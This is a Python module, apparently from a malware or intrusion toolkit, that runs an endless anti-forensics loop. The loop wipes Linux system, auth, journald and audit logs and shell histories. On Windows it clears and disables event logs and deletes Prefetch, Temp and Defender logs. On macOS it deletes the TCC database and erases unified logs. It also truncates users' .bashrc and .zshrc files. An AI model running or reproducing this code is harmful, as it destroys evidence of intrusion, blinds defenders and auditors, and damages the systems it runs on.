import os
import subprocess
import threading
import time
import traceback
import sqlite3

from pathlib import Path
from modules.logger import log_event
from modules.config import load_config

cfg = load_config().get("anti_forensics", {})
LINUX_INTERVAL = cfg.get("linux_clear_interval", 3600)
WINDOWS_CLEAR = cfg.get("windows_clear_logs", True)
MACOS_CLEAR = cfg.get("macos_clear_tcc", True)

def clear_linux_logs():
    try:
        # Wipe common log directories and all *.log, *.gz, *.1, *.old files
        logs = ["/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log"]
        patterns = ["**/*.log", "**/*.gz", "**/*.1", "**/*.old", "**/messages", "**/secure", "**/btmp", "**/faillog"]
        for pat in patterns:
            logs += [str(p) for p in Path("/var/log").glob(pat)]
        for log in set(logs):
            try:
                if os.path.exists(log):
                    open(log, "w").close()
                    os.utime(log, (time.time(), time.time()))
            except Exception:
                pass
        # Clear shell histories, bashrc/zshrc, and remove .history files
        home = Path.home()
        for hist in [home / ".bash_history", home / ".zsh_history", home / ".bashrc", home / ".zshrc"]:
            try:
                if hist.exists():
                    open(hist, "w").close()
                    os.utime(hist, (time.time(), time.time()))
            except Exception:
                pass
        for histfile in home.glob(".*history*"):
            try:
                open(histfile, "w").close()
            except Exception:
                pass
        # Remove utmp/wtmp/lastlog and other login traces
        for special in ["/var/run/utmp", "/var/log/wtmp", "/var/log/lastlog", "/var/log/faillog"]:
            try:
                if os.path.exists(special):
                    open(special, "wb").close()
            except Exception:
                pass
        # Remove journald logs and rotate/vacuum aggressively
        subprocess.run(["journalctl", "--rotate"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        subprocess.run(["journalctl", "--vacuum-time=1s"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        # Remove audit logs if present
        for audit in ["/var/log/audit/audit.log", "/var/log/audit/audit.log.1"]:
            try:
                if os.path.exists(audit):
                    open(audit, "w").close()
            except Exception:
                pass
        log_event("anti_forensics", b"Cleared Linux logs/histories/utmp/wtmp/journald/audit.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing Linux logs: {e}".encode())

def clear_windows_logs():
    try:
        # Clear Application, Security, System event logs and all *.evtx
        cmds = [
            ["wevtutil", "cl", "Application"],
            ["wevtutil", "cl", "Security"],
            ["wevtutil", "cl", "System"]
        ]
        for cmd in cmds:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        # Clear all .evtx logs in system32/winevt/Logs
        logs_dir = os.path.expandvars(r"%SystemRoot%\System32\winevt\Logs")
        if os.path.isdir(logs_dir):
            for evtx in Path(logs_dir).glob("*.evtx"):
                try:
                    open(evtx, "wb").close()
                except Exception:
                    pass
        # Disable future logs by setting retention to 0
        for logname in ["Application", "Security", "System"]:
            try:
                subprocess.run(["wevtutil", "sl", logname, "/ms:0"], timeout=15)
            except Exception:
                pass
        # Clear Prefetch, Recent, and Temp files
        for pf in [
            os.path.expandvars(r"%SystemRoot%\Prefetch"),
            os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent"),
            os.path.expandvars(r"%TEMP%"),
            os.path.expandvars(r"%SystemRoot%\Temp")
        ]:
            if os.path.isdir(pf):
                for f in Path(pf).glob("*"):
                    try:
                        if f.is_file():
                            os.remove(f)
                        elif f.is_dir():
                            import shutil
                            shutil.rmtree(f, ignore_errors=True)
                    except Exception:
                        pass
        # Remove Windows Defender logs
        defender_log = os.path.expandvars(r"%ProgramData%\Microsoft\Windows Defender\Support")
        if os.path.isdir(defender_log):
            for f in Path(defender_log).glob("*"):
                try:
                    os.remove(f)
                except Exception:
                    pass
        log_event("anti_forensics", b"Cleared and disabled Windows Event Logs, Prefetch, Recent, Temp, Defender logs.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing Windows logs: {e}".encode())

def clear_macos_tcc():
    try:
        # Remove TCC.db to wipe permissions history
        tcc_path = "/Library/Application Support/com.apple.TCC/Tcc.db"
        if os.path.exists(tcc_path):
            os.remove(tcc_path)
        # Erase unified logs (requires macOS 10.12+)
        subprocess.run(["log", "erase", "--all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        # Remove bash/zsh histories and .history files
        home = Path.home()
        for hist in [home / ".bash_history", home / ".zsh_history"]:
            try:
                if hist.exists():
                    open(hist, "w").close()
                    os.utime(hist, (time.time(), time.time()))
            except Exception:
                pass
        for histfile in home.glob(".*history*"):
            try:
                open(histfile, "w").close()
            except Exception:
                pass
        # Remove ASL logs (legacy macOS)
        asl_dir = "/private/var/log/asl"
        if os.path.isdir(asl_dir):
            for f in Path(asl_dir).glob("*"):
                try:
                    os.remove(f)
                except Exception:
                    pass
        log_event("anti_forensics", b"Cleared macOS TCC, unified logs, shell histories, ASL logs.")
    except Exception as e:
        log_event("anti_forensics", f"Error clearing macOS logs: {e}".encode())

def anti_forensics_loop():
    while True:
        try:
            if os.name == "nt" and WINDOWS_CLEAR:
                clear_windows_logs()
            elif os.name == "posix" and sys.platform.startswith("linux"):
                clear_linux_logs()
            elif sys.platform == "darwin" and MACOS_CLEAR:
                clear_macos_tcc()
        except Exception as e:
            log_event("anti_forensics", f"Anti-forensics loop error: {e}".encode())
        time.sleep(LINUX_INTERVAL)
